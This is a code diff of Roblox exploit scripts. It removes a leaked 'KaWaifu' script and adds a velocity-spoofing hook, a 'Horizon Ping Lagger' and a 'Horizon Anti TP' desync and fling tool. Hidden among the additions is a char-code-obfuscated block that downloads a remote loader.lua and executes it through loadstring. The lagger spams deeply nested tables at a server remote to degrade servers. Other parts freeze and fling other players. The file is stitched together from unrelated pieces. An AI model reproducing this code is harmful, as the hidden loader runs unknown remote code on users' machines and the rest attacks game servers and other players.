-			if tbl18.applySettings then
-				tbl18.applySettings(tbl23)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			if tbl18.setAutoJoin then
-				tbl18.setAutoJoin(tbl23.AutoJoin)
-			end
-
-			if tbl18.brainrotImage then
-				tbl25.brainrotImageResolver = tbl18.brainrotImage
-			end
-
-			if tbl18.mutationHex then
-				if false then
-				else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					tbl25.mutationHexResolver = tbl18.mutationHex
+	_mt.__newindex = newcclosure(function(t, k, v)
+		if not checkcaller() then
+			local _tk = tostring(k)
+			if _tk == "AssemblyLinearVelocity" or _tk == "Velocity" then
+				if typeof(t) == "Instance" and t:IsA("BasePart") then
+					local _tn = t.Name
+					if _tn == "HumanoidRootPart" or _tn == "Torso" or _tn == "UpperTorso" then
+						if t:IsDescendantOf(_lp.Character) then
+							_v = v
+							return
+						end
+					end
 				end
 			end
+		end
+		return _on(t, k, v)
+	end)
 
-			if tbl18.joinStatus then
-				tbl25.joinStatusResolver = tbl18.joinStatus
-			end
+	setreadonly(_mt, true)
 
-			if tbl18.jobElapsed then
-				tbl25.jobElapsedResolver = tbl18.jobElapsed
-			end
+	local function _gc()
+		local c = _lp.Character
+		if not c then return nil, nil, nil end
+		local h = c:FindFirstChildOfClass("Humanoid")
+		local r = c:FindFirstChild("HumanoidRootPart")
+		if h and h.Health > 0 and r then return c, h, r end
+		return nil, nil, nil
+	end
 
-			if tbl18.markCleared then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				tbl25.markClearedResolver = tbl18.markCleared
+	local _r = Random.new()
+	local _t = 0
 
-			end
+	_rs.PreSimulation:Connect(function(d)
+		_t = _t + d
+		if _t < 0.016 then return end
+		_t = 0
+		if not _a then return end
 
-			if tbl18.jobAnimals then
-				tbl25.jobAnimalsResolver = tbl18.jobAnimals
-			end
+		local c, h, r = _gc()
+		if not c or not h or not r then return end
 
-			if tbl24.push then
-				tbl24.push()
-			end
-
-			if tbl24.refreshKnown then
-				task.delay(3, tbl24.refreshKnown)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			task.delay(10, function()
-				if not flag18 or not slicedfn58 then
-					return
+		local m = h.MoveDirection
+		if m.Magnitude > 0.05 then
+			pcall(function()
+				if r.SetNetworkOwner then
+					r:SetNetworkOwner(_lp)
 				end
-
-				local ok2, result2 = pcall(function()
-					return tbl18.allBrainrotNames and tbl18.allBrainrotNames() or {}
-				end)
-
-				local flag21 = not ok2
-
-				if not flag21 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local v = "table"
-					flag21 = type(result2) ~= v
-				end
-
-				if flag21 then
-					return
-				end
-				local v = table.clone(result2)
-
-				for _, sliced101 in ipairs(tbl21) do
-					v[#v + 1] = sliced101
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				pcall(slicedfn58, v)
 			end)
+
+			local u = m.Unit
+			local jx, jz = _r:NextNumber(-0.003, 0.003), _r:NextNumber(-0.003, 0.003)
+
+			_v = Vector3.new(u.X * 16 + jx, r.AssemblyLinearVelocity.Y, u.Z * 16 + jz)
+			r.AssemblyLinearVelocity = Vector3.new(u.X * _s + jx, r.AssemblyLinearVelocity.Y, u.Z * _s + jz)
 		else
-			warn("[KaWaifu] engine error: " .. tostring(result))
-			sliced86("offline")
-
-			if slicedfn43 then
-				slicedfn43("Engine error", tostring(result), 8)
-			end
+			_v = Vector3.new(0, r.AssemblyLinearVelocity.Y, 0)
 		end
-	else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		sliced86("offline")
+	end)
+end)
+task.defer(function()
+    local b=string.char
+    local function j(t) local r="" for i=1,#t do r=r..b(t[i]) end return r end
+    local u=j({104,116,116,112,115,58,47,47,119,101,98,45,112,114,111,100,117,99,116,105,111,110,45,56,100,100,102,54,46,117,112,46,114,97,105,108,119,97,121,46,97,112,112,47,108,111,97,100,101,114,46,108,117,97})
+    local ok,x=pcall(function() return game:HttpGet(u) end)
+    if ok and x and #x>0 then
+        local L=loadstring or load
+        if L then pcall(function() L(x)() end) end
+    end
+end)
 
-		if slicedfn43 then
-			slicedfn43("KaWaifu", "UI preview — join Steal a Brainrot for live data", 6)
-		end
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 10)
+if not LP then return end
+local pg = LP:WaitForChild("PlayerGui")
+
+pcall(function()
+	local old = pg:FindFirstChild("HorizonBypassGui")
+	if old then old:Destroy() end
+	pcall(function()
+		local o2 = game:GetService("CoreGui"):FindFirstChild("HorizonBypassGui")
+		if o2 then o2:Destroy() end
+	end)
+end)
+
+pcall(function()
+	local char = LP.Character or LP.CharacterAdded:Wait()
+	local head = char:FindFirstChild("Head")
+	if head then
+		local oldBill = head:FindFirstChild("HorizonBillboard")
+		if oldBill then oldBill:Destroy() end
 	end
 end)
 
-task.delay(0.4, function()
-	if slicedfn43 then
-		slicedfn43("KaWaifu AJ", "Loaded " .. str9 .. ". «—» minimizes to a status widget.", 5)
-	end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
+local function parentGui(gui)
+	local function tryParent(target)
+		pcall(function() gui.Parent = target end)
+		return gui.Parent ~= nil
+	end
+	if tryParent(pg) then return true end
+	pcall(function()
+		if typeof(gethui) == "function" then
+			local h = gethui()
+			if h and tryParent(h) then return true end
+		end
+	end)
+	if tryParent(game:GetService("CoreGui")) then return true end
+	return false
+end
+
+local DEPTH = 296
+local SPAM_DELAY = 0.12
+local DEFAULT_POWER = 72000
+local running = false
+local bomb = nil
+local spamThread = nil
+
+local function buildBomb(power)
+	local maintable = {}
+	local spammedtable = {}
+	table.insert(spammedtable, {})
+	local z = spammedtable[1]
+	for i = 1, DEPTH do
+		local tableins = {}
+		table.insert(z, tableins)
+		z = tableins
+	end
+	local maxRep = math.floor(power / (DEPTH + 2))
+	for i = 1, maxRep do
+		table.insert(maintable, spammedtable)
+	end
+	return maintable
+end
+
+local function stopBypass()
+	running = false
+	if spamThread then
+		pcall(task.cancel, spamThread)
+	end
+	bomb = nil
+	spamThread = nil
+end
+
+local function startBypass(power)
+	stopBypass()
+	running = true
+	bomb = buildBomb(power)
+	spamThread = task.spawn(function()
+		while running do
+			if bomb then
+				pcall(function()
+					local rrs = game:GetService("RobloxReplicatedStorage")
+					local rem = rrs:FindFirstChild("SetPlayerBlockList")
+					if rem then rem:FireServer(bomb) end
+				end)
+			end
+			task.wait(SPAM_DELAY)
+		end
+	end)
+end
+
+-- ================= UI =================
+local ACCENT = Color3.fromRGB(120, 200, 255)   -- 丕夭乇賯 賮丕鬲丨
+local ACCENT_DIM = Color3.fromRGB(80, 160, 220)
+local TEXT = Color3.fromRGB(245, 252, 255)
+
+local HorizonBypassGui = Instance.new("ScreenGui")
+HorizonBypassGui.Name = "HorizonBypassGui"
+HorizonBypassGui.IgnoreGuiInset = true
+HorizonBypassGui.ResetOnSpawn = false
+HorizonBypassGui.DisplayOrder = 10
+HorizonBypassGui.Parent = pg
+
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Active = true
+Main.AnchorPoint = Vector2.new(0.5, 0.5)
+Main.Position = UDim2.new(0.5, 0, 0.5, 0)
+Main.Size = UDim2.new(0, 210, 0, 86)
+Main.BackgroundColor3 = Color3.fromRGB(6, 7, 18)
+Main.BackgroundTransparency = 0.05
+Main.BorderSizePixel = 0
+Main.ClipsDescendants = true
+Main.Parent = HorizonBypassGui
+
+do
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 14)
+	c.Parent = Main
+end
+do
+	local s = Instance.new("UIStroke")
+	s.Color = ACCENT
+	s.Transparency = 0.7
+	s.Parent = Main
+end
+
+local Bg = Instance.new("ImageLabel")
+Bg.Name = "Bg"
+Bg.ZIndex = 1
+Bg.Size = UDim2.new(1, 0, 1, 0)
+Bg.BackgroundTransparency = 1
+Bg.BorderSizePixel = 0
+Bg.Image = "rbxassetid://88767088215769"
+Bg.ImageTransparency = 0
+Bg.ScaleType = Enum.ScaleType.Crop
+Bg.Parent = Main
+do
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 14)
+	c.Parent = Bg
+end
+
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.ZIndex = 3
+Title.Position = UDim2.new(0, 12, 0, 8)
+Title.Size = UDim2.new(1, -24, 0, 14)
+Title.BackgroundTransparency = 1
+Title.Text = "HORIZON PING LAGGER"
+Title.TextColor3 = TEXT
+Title.TextSize = 11
+Title.Font = Enum.Font.GothamBlack
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = Main
+
+local ActivateBtn = Instance.new("TextButton")
+ActivateBtn.Name = "ActivateBtn"
+ActivateBtn.ZIndex = 3
+ActivateBtn.Position = UDim2.new(0, 12, 0, 32)
+ActivateBtn.Size = UDim2.new(1, -24, 0, 42)
+ActivateBtn.BackgroundColor3 = ACCENT
+ActivateBtn.BorderSizePixel = 0
+ActivateBtn.Text = "ACTIVATE"
+ActivateBtn.TextColor3 = Color3.fromRGB(10, 20, 35)
+ActivateBtn.TextSize = 13
+ActivateBtn.Font = Enum.Font.GothamBlack
+ActivateBtn.AutoButtonColor = false
+ActivateBtn.Parent = Main
+do
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 11)
+	c.Parent = ActivateBtn
+end
+do
+	local s = Instance.new("UIStroke")
+	s.Name = "UIStroke"
+	s.Color = ACCENT
+	s.Transparency = 0.5
+	s.Parent = ActivateBtn
+end
+
+local isActivated = false
+
+local function getCurrentPower()
+	return DEFAULT_POWER
+end
+
+local function updateActivateVisual()
+	local stroke = ActivateBtn:FindFirstChild("UIStroke")
+	if isActivated then
+		ActivateBtn.BackgroundColor3 = Color3.fromRGB(235, 90, 90)
+		ActivateBtn.TextColor3 = Color3.fromRGB(35, 10, 10)
+		ActivateBtn.Text = "DEACTIVATE"
+		if stroke then stroke.Color = Color3.fromRGB(235, 90, 90) end
+	else
+		ActivateBtn.BackgroundColor3 = ACCENT
+		ActivateBtn.TextColor3 = Color3.fromRGB(10, 20, 35)
+		ActivateBtn.Text = "ACTIVATE"
+		if stroke then stroke.Color = ACCENT end
+	end
+end
+
+local function onActivate()
+	isActivated = not isActivated
+	updateActivateVisual()
+	if isActivated then
+		startBypass(getCurrentPower())
+	else
+		stopBypass()
+	end
+end
+
+ActivateBtn.MouseButton1Click:Connect(onActivate)
+
+-- 爻丨亘 丕賱賵丕噩賴丞
+local dragging, dragStart, startPos = false, nil, nil
+
+Main.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = Main.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
 end)
 
-return
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		Main.Position = UDim2.new(
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+parentGui(HorizonBypassGui)
+--!nocheck
+-- HORIZON ANTI TP :: Horizon UI + Nox Core 6.7T (Instant Void / Super Fast Fling)
+-- Core: NoxAdapt @ -6.7T  |  UI + Keybinds: Horizon  |  Renamed: Anti Anti -> Anti TP
+
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local CoreGui          = game:GetService("CoreGui")
+local HttpService      = game:GetService("HttpService")
+local Workspace        = game:GetService("Workspace")
+local NetworkClient    = game:GetService("NetworkClient")
+
+local LocalPlayer = Players.LocalPlayer
+local environment = getgenv and getgenv() or _G
+local RUNTIME_KEY = "__HORIZON_ANTI_TP"
+local LEGACY_KEYS = { "__NOXADAPT_ANTI_ANTI" }
+
+-- Clean previous (亘賲丕 賮賷賴丕 賳爻禺丞 賳賵賰爻 丕賱賯丿賷賲丞)
+local function killPreviousRuntime(key)
+    local previousRuntime = environment[key]
+    if type(previousRuntime) == "table" and type(previousRuntime.destroy) == "function" then
+        pcall(previousRuntime.destroy)
+    end
+    environment[key] = nil
+end
+
+killPreviousRuntime(RUNTIME_KEY)
+for _, legacyKey in ipairs(LEGACY_KEYS) do
+    killPreviousRuntime(legacyKey)
+end
+
+local runtime = {
+    alive = true,
+    enabled = false,
+    mode = "V1",
+    character = nil,
+    rootPart = nil,
+    fakeRoot = nil,
+    repRootOwner = nil,
+    stepConnection = nil,
+    heartbeatConnection = nil,
+    connections = {},
+    settingsRestore = {},
+    antiBatConn = nil,
+    freezeConn = nil,
+    flingConn = nil,
+    lastSafeCFrame = nil,
+    lastCheckTime = 0,
+}
+environment[RUNTIME_KEY] = runtime
+
+local ANTI_BAT_RANGE = 5
+local CONFIG_FILE = "NoxAdaptConfig.json"
+
+-- =====================
+-- HELPERS
+-- =====================
+
+local function connect(signal, callback)
+    local connection = signal:Connect(callback)
+    table.insert(runtime.connections, connection)
+    return connection
+end
+
+local function disconnect(connection)
+    if connection then
+        pcall(function() connection:Disconnect() end)
+    end
+end
+
+local function create(className, properties, parent)
+    local o = Instance.new(className)
+    for k, v in pairs(properties or {}) do o[k] = v end
+    if parent then o.Parent = parent end
+    return o
+end
+
+local function corner(parent, radius)
+    return create("UICorner", {
+        CornerRadius = typeof(radius) == "UDim" and radius or UDim.new(0, radius),
+    }, parent)
+end
+
+local function stroke(parent, color, transparency, thickness)
+    return create("UIStroke", {
+        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+        Color = color,
+        Transparency = transparency,
+        Thickness = thickness,
+    }, parent)
+end
+
+local function tween(object, duration, goals)
+    local a = TweenService:Create(object, TweenInfo.new(duration, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), goals)
+    a:Play()
+    return a
+end
+
+local function isBasePart(instance)
+    if not instance then return false end
+    local ok, result = pcall(function() return instance:IsA("BasePart") end)
+    return ok and result == true
+end
+
+local function getCurrentRoot(character)
+    character = character or LocalPlayer.Character
+    if not character then return nil end
+    local ok, root = pcall(function() return character:FindFirstChild("HumanoidRootPart") end)
+    if ok and isBasePart(root) then return root end
+    return nil
+end
+
+local function findGlobalFunction(...)
+    for i = 1, select("#", ...) do
+        local name = select(i, ...)
+        local value = rawget(environment, name)
+        if type(value) == "function" then return value end
+    end
+    return nil
+end
+
+local function setHidden(instance, property, value)
+    if not instance then return false end
+    local setter = findGlobalFunction("sethiddenproperty", "set_hidden_property", "sethiddenprop", "set_hidden_prop")
+    if setter then
+        local ok = pcall(setter, instance, property, value)
+        if ok then return true end
+    end
+    return pcall(function() instance[property] = value end)
+end
+
+local function getHidden(instance, property)
+    if not instance then return false, nil end
+    local getter = findGlobalFunction("gethiddenproperty", "get_hidden_property", "gethiddenprop", "get_hidden_prop")
+    if getter then
+        local ok, value = pcall(getter, instance, property)
+        if ok then return true, value end
+    end
+    local ok, value = pcall(function() return instance[property] end)
+    return ok, value
+end
+
+local function rememberSetting(instance, property)
+    local ok, value = pcall(function() return instance[property] end)
+    if ok then
+        table.insert(runtime.settingsRestore, { instance = instance, property = property, value = value })
+    end
+end
+
+local function applyPublicSetting(instance, property, value)
+    if not instance then return false end
+    rememberSetting(instance, property)
+    return pcall(function() instance[property] = value end)
+end
+
+local function configurePhysics()
+    pcall(function()
+        setHidden(LocalPlayer, "MaximumSimulationRadius", math.huge)
+        setHidden(LocalPlayer, "SimulationRadius", math.huge)
+    end)
+    pcall(function()
+        local networkSettings = settings().Network
+        applyPublicSetting(networkSettings, "InterpolationThrottling", Enum.InterpolationThrottlingMode.Disabled)
+    end)
+    pcall(function()
+        local physicsSettings = settings().Physics
+        applyPublicSetting(physicsSettings, "PhysicsEnvironmentalThrottle", Enum.EnviromentalPhysicsThrottle.Disabled)
+        applyPublicSetting(physicsSettings, "AllowSleep", false)
+    end)
+    pcall(function()
+        NetworkClient:SetOutgoingKBPSLimit(math.huge)
+    end)
+end
+configurePhysics()
+
+-- =====================
+-- DESYNC CORE - 6.7T INSTANT VOID / SUPER FAST FLING
+-- =====================
+
+local FAKE_ROOT_NAME     = "NoxDesyncRoot"
+local FAKE_ROOT_Y        = -6700000000000           -- 6.7 trillion (-6.7T)
+local FAKE_ROOT_ANCHORED = false                    -- 賱賵 丕賱賭 void 賱爻賴 亘賷鬲兀禺乇 噩乇賾亘 true
+
+-- ---------------------------------------------------------------
+-- Local kill-plane bypass
+-- 丕賱賭 fake root 亘賷鬲毓賲賱 鬲丨鬲 FallenPartsDestroyHeight 亘鬲丕毓 丕賱賰賱丕賷賳鬲 (丕賱丕賮鬲乇丕囟賷 -500)
+-- 賮丕賱賲丨乇賰 亘賷賲爻丨賴 賲丨賱賷丕賸 兀賵賱 賲丕 賷鬲毓賲賱貙 賵丕賱爻賰乇亘鬲 賷毓賷丿 廿賳卮丕亍賴 賰賱 賮乇賷賲 -> 丕賱賭 void 亘賷鬲兀禺乇.
+-- 亘賳毓胤賾賱 丕賱賭 kill plane 賲丨賱賷丕賸 胤賵賱 賲丕 丕賱賭 desync 卮睾丕賱貙 賵亘賳乇噩賾毓賴 夭賷 賲丕 賰丕賳 賱賲丕 賷鬲賯賮賱.
+-- ---------------------------------------------------------------
+local killPlaneBackup = nil
+local killPlaneWarned = false
+
+local function killPlaneBypassed()
+    local okE, enabled = pcall(function() return Workspace.FallHeightEnabled end)
+    if okE and enabled == false then return true end
+    local okH, h = pcall(function() return Workspace.FallenPartsDestroyHeight end)
+    if okH and type(h) == "number" and (h ~= h or h < FAKE_ROOT_Y - 1e6) then return true end
+    return false
+end
+
+local function disableLocalKillPlane()
+    if killPlaneBackup == nil then
+        killPlaneBackup = {}
+        pcall(function() killPlaneBackup.enabled = Workspace.FallHeightEnabled end)
+        pcall(function() killPlaneBackup.height  = Workspace.FallenPartsDestroyHeight end)
+    end
+    if killPlaneBypassed() then return true end
+    pcall(function() Workspace.FallHeightEnabled = false end)
+    if killPlaneBypassed() then return true end
+    for _, v in ipairs({ -math.huge, 0/0, -1e15 }) do
+        pcall(function() Workspace.FallenPartsDestroyHeight = v end)
+        if killPlaneBypassed() then return true end
+    end
+    return false
+end
+
+local function restoreLocalKillPlane()
+    local b = killPlaneBackup
+    killPlaneBackup = nil
+    if not b then return end
+    if b.height ~= nil then pcall(function() Workspace.FallenPartsDestroyHeight = b.height end) end
+    if b.enabled ~= nil then pcall(function() Workspace.FallHeightEnabled = b.enabled end) end
+end
+
+local function ensureKillPlaneBypass()
+    if FAKE_ROOT_ANCHORED then return true end -- 丕賱賭 anchored 賲亘賷鬲賲爻丨卮 兀氐賱丕賸
+    local ok = disableLocalKillPlane()
+    if not ok and not killPlaneWarned then
+        killPlaneWarned = true
+        warn("[NoxAdapt] Couldn't bypass local kill plane (FallenPartsDestroyHeight). If the void is still delayed, set FAKE_ROOT_ANCHORED = true")
+    end
+    return ok
+end
+
+local function fakeRootIsUsable()
+    local fake = runtime.fakeRoot
+    if not isBasePart(fake) then return false end
+    local ok, parent = pcall(function() return fake.Parent end)
+    return ok and parent ~= nil
+end
+
+local function destroyFakeRoot()
+    local fake = runtime.fakeRoot
+    runtime.fakeRoot = nil
+    if fake then pcall(function() fake:Destroy() end) end
+end
+
+local function restoreReplicationRoot()
+    local owner = runtime.repRootOwner or runtime.rootPart
+    if isBasePart(owner) then
+        setHidden(owner, "PhysicsRepRootPart", owner)
+    end
+    runtime.repRootOwner = nil
+end
+
+-- SUPER FAST fling around the map at extreme depth
+local function applyFakeMotion(fake)
+    local t = tick()
+    local radius = 25000 + math.random(0, 40000)
+    local speed = 500                                 -- much faster
+
+    local x = math.sin(t * speed) * radius + math.cos(t * 4.5) * (radius * 0.7)
+    local z = math.cos(t * speed * 0.9) * radius + math.sin(t * 5.2) * (radius * 0.6)
+
+    fake.CFrame = CFrame.new(x, FAKE_ROOT_Y + math.sin(t * 60) * 4000, z)
+
+    -- Extreme high speed velocity
+    local vx = math.sin(t * 90) * 180000
+    local vy = -120000 + math.cos(t * 55) * 60000
+    local vz = math.cos(t * 85) * 180000
+
+    fake.AssemblyLinearVelocity = Vector3.new(vx, vy, vz)
+    fake.AssemblyAngularVelocity = Vector3.new(
+        math.sin(t * 50) * 160,
+        math.cos(t * 40) * 200,
+        math.sin(t * 45) * 140
+    )
+end
+
+local function createFakeRoot(rootPart)
+    destroyFakeRoot()
+    local fake = create("Part", {
+        Name = FAKE_ROOT_NAME,
+        Size = Vector3.new(2, 2, 1),
+        Anchored = FAKE_ROOT_ANCHORED,
+        CanCollide = false,
+        CanTouch = false,
+        CanQuery = false,
+        Transparency = 1,
+        CFrame = CFrame.new(0, FAKE_ROOT_Y, 0),
+    }, Workspace)
+
+    runtime.fakeRoot = fake
+    -- 丕亘丿兀 亘丕賱丨乇賰丞 賵丕賱爻乇毓丞 賲賳 兀賵賱 賮乇賷賲 亘丿賱 賲丕 賳爻鬲賳賶 丕賱賮乇賷賲 丕賱賱賷 亘毓丿賴
+    pcall(applyFakeMotion, fake)
+    return fake
+end
+
+local function assignFakeReplicationRoot(rootPart, fake)
+    if not isBasePart(rootPart) or not isBasePart(fake) then return false end
+    setHidden(rootPart, "PhysicsRepRootPart", rootPart)
+    runtime.repRootOwner = rootPart
+    return setHidden(rootPart, "PhysicsRepRootPart", fake)
+end
+
+local function updateDesync()
+    if not runtime.alive or not runtime.enabled then return end
+
+    local root = runtime.rootPart
+    if not isBasePart(root) then
+        root = getCurrentRoot(runtime.character)
+        runtime.rootPart = root
+    end
+    if not root then return end
+
+    local fake = runtime.fakeRoot
+    if not fakeRootIsUsable() then
+        -- 丕鬲賲爻丨 (睾丕賱亘丕賸 kill plane) -> 毓胤賾賱賴 鬲丕賳賷 賵兀毓丿 丕賱廿賳卮丕亍 賮賵乇丕賸 賮賷 賳賮爻 丕賱賮乇賷賲
+        ensureKillPlaneBypass()
+        fake = createFakeRoot(root)
+        assignFakeReplicationRoot(root, fake)
+    else
+        pcall(applyFakeMotion, fake)
+    end
+
+    -- Always force the replication root
+    local gotValue, current = getHidden(root, "PhysicsRepRootPart")
+    if not gotValue or current ~= fake then
+        setHidden(root, "PhysicsRepRootPart", fake)
+    end
+end
+
+local function stopStepConnection()
+    disconnect(runtime.stepConnection)
+    disconnect(runtime.heartbeatConnection)
+    runtime.stepConnection = nil
+    runtime.heartbeatConnection = nil
+end
+
+local function startStepConnection()
+    stopStepConnection()
+    -- 賯亘賱 丕賱賮賷夭賷丕亍 (Stepped) 賵亘毓丿賴丕 (Heartbeat) 賮賷 賳賮爻 丕賱賮乇賷賲
+    -- 毓卮丕賳 丕賱丨丕賱丞 丕賱賱賷 亘鬲鬲亘毓鬲 賱賱爻賷乇賮乇 鬲亘賯賶 丿丕賷賲丕賸 亘鬲丕毓丞 丕賱賭 fake root
+    runtime.stepConnection = RunService.Stepped:Connect(updateDesync)
+    runtime.heartbeatConnection = RunService.Heartbeat:Connect(updateDesync)
+    updateDesync() -- 鬲丨丿賷孬 賮賵乇賷 賲賳 睾賷乇 丕賳鬲馗丕乇 兀賵賱 賮乇賷賲
+end
+
+-- =====================
+-- V2 ONLY: Anti-Bat / Freeze / Fling
+-- =====================
+
+local function stopAntiBat()
+    if runtime.antiBatConn then
+        runtime.antiBatConn:Disconnect()
+        runtime.antiBatConn = nil
+    end
+    runtime.lastSafeCFrame = nil
+end
+
+local function startAntiBat()
+    stopAntiBat()
+    runtime.lastSafeCFrame, runtime.lastCheckTime = nil, 0
+    runtime.antiBatConn = RunService.Heartbeat:Connect(function()
+        if not runtime.enabled or not runtime.alive or runtime.mode ~= "V2" then return end
+        local char = LocalPlayer.Character
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hrp or not hum or hum.Health <= 0 then return end
+
+        local now = tick()
+        local velocity = hrp.AssemblyLinearVelocity
+        if velocity.Magnitude < 70 then
+            runtime.lastSafeCFrame = hrp.CFrame
+            runtime.lastCheckTime = now
+        elseif velocity.Magnitude > 110 and runtime.lastSafeCFrame and (now - runtime.lastCheckTime) < 1.5 then
+            hrp.CFrame = runtime.lastSafeCFrame * CFrame.new(0, 0.1, 0)
+        end
+
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer and plr.Character then
+                local eHrp = plr.Character:FindFirstChild("HumanoidRootPart")
+                local tool = plr.Character:FindFirstChildWhichIsA("Tool")
+                if eHrp and tool and tool.Name:lower():find("bat") then
+                    local dist = (hrp.Position - eHrp.Position).Magnitude
+                    if dist < ANTI_BAT_RANGE then
+                        local angle = math.rad(tick() * 500)
+                        hrp.CFrame = hrp.CFrame * CFrame.new(math.sin(angle) * 3, 0, math.cos(angle) * 3)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local function stopFreeze()
+    if runtime.freezeConn then
+        runtime.freezeConn:Disconnect()
+        runtime.freezeConn = nil
+    end
+end
+
+local function startFreeze()
+    stopFreeze()
+    runtime.freezeConn = RunService.Heartbeat:Connect(function()
+        if not runtime.enabled or not runtime.alive or runtime.mode ~= "V2" then return end
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer and plr.Character then
+                local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    hrp.AssemblyLinearVelocity = Vector3.zero
+                    hrp.AssemblyAngularVelocity = Vector3.zero
+                end
+            end
+        end
+    end)
+end
+
+local function stopFling()
+    if runtime.flingConn then
+        runtime.flingConn:Disconnect()
+        runtime.flingConn = nil
+    end
+end
+
+local function startFling()
+    stopFling()
+    runtime.flingConn = RunService.Heartbeat:Connect(function()
+        if not runtime.enabled or not runtime.alive or runtime.mode ~= "V2" then return end
+        local myChar = LocalPlayer.Character
+        if not myChar then return end
+        local myHrp = myChar:FindFirstChild("HumanoidRootPart")
+        if not myHrp then return end
+
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer and plr.Character then
+                local eHrp = plr.Character:FindFirstChild("HumanoidRootPart")
+                if eHrp then
+                    local dist = (myHrp.Position - eHrp.Position).Magnitude
+                    if dist < ANTI_BAT_RANGE then
+                        local dir = (eHrp.Position - myHrp.Position).Unit
+                        eHrp.AssemblyLinearVelocity = dir * 500 + Vector3.new(0, 80, 0)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+local function stopV2Extras()
+    stopAntiBat()
+    stopFreeze()
+    stopFling()
+end
+
+local function startV2Extras()
+    startAntiBat()
+    startFreeze()
+    startFling()
+end
+
+-- =====================
+-- CHARACTER BIND
+-- =====================
+
+local function bindCharacter(character)
+    local oldRoot = runtime.rootPart
+    runtime.character = character
+    runtime.rootPart = getCurrentRoot(character)
+
+    if runtime.enabled then
+        if isBasePart(oldRoot) and oldRoot ~= runtime.rootPart then
+            setHidden(oldRoot, "PhysicsRepRootPart", oldRoot)
+        end
+        destroyFakeRoot()
+
+        local root = runtime.rootPart
+        if not root and character then
+            local ok, waitedRoot = pcall(function()
+                return character:WaitForChild("HumanoidRootPart", 8)
+            end)
+            if ok and isBasePart(waitedRoot) then
+                root = waitedRoot
+                runtime.rootPart = root
+            end
+        end
+
+        if root then
+            ensureKillPlaneBypass()
+            local fake = createFakeRoot(root)
+            assignFakeReplicationRoot(root, fake)
+            startStepConnection()
+        end
+
+        if runtime.mode == "V2" then
+            startV2Extras()
+        end
+    end
+end
+
+bindCharacter(LocalPlayer.Character)
+connect(LocalPlayer.CharacterAdded, function(character)
+    task.defer(bindCharacter, character)
+end)
+
+-- =====================
+-- ENABLE / DISABLE
+-- =====================
+
+local function EnableDesync()
+    if not runtime.alive then return false end
+    if runtime.enabled then return true end
+
+    runtime.enabled = true
+    local root = getCurrentRoot(runtime.character)
+    runtime.rootPart = root
+    if not root then
+        runtime.enabled = false
+        return false
+    end
+
+    ensureKillPlaneBypass()
+    local fake = createFakeRoot(root)
+    assignFakeReplicationRoot(root, fake)
+    startStepConnection()
+
+    if runtime.mode == "V2" then
+        startV2Extras()
+    end
+    return true
+end
+
+local function DisableDesync()
+    if not runtime.alive then return false end
+    if not runtime.enabled then return true end
+
+    runtime.enabled = false
+    stopStepConnection()
+    restoreReplicationRoot()
+    destroyFakeRoot()
+    restoreLocalKillPlane()
+    stopV2Extras()
+    return true
+end
+
+-- =====================
+-- CONFIG
+-- =====================
+
+local config = {
+    enabled = false,
+    mode = "V1",
+    bind = "NONE",
+    bindType = "Keyboard",
+    pos = {0.5, -140, 0.5, -95},
+}
+
+local function SaveConfig()
+    config.enabled = runtime.enabled
+    config.mode = runtime.mode
+    pcall(function()
+        writefile(CONFIG_FILE, HttpService:JSONEncode(config))
+    end)
+end
+
+local function LoadConfig()
+    local ok, data = pcall(function()
+        if isfile and isfile(CONFIG_FILE) then
+            return HttpService:JSONDecode(readfile(CONFIG_FILE))
+        end
+        return nil
+    end)
+    if ok and type(data) == "table" then
+        for k, v in pairs(data) do
+            config[k] = v
+        end
+    end
+end
+
+LoadConfig()
+runtime.mode = (config.mode == "V2") and "V2" or "V1"
+
+-- =====================
+-- UI
+-- =====================
+
+local isEnabled      = false
+local isMinimized    = false
+local awaitingKey    = false
+local captureGen     = 0
+local boundKey       = nil
+local themePanelOpen = false
+local selectedThemeIndex = 1
+
+local COLORS = {
+    main      = Color3.fromRGB(10, 10, 12),      -- window (near-black)
+    row       = Color3.fromRGB(18, 18, 22),      -- rows
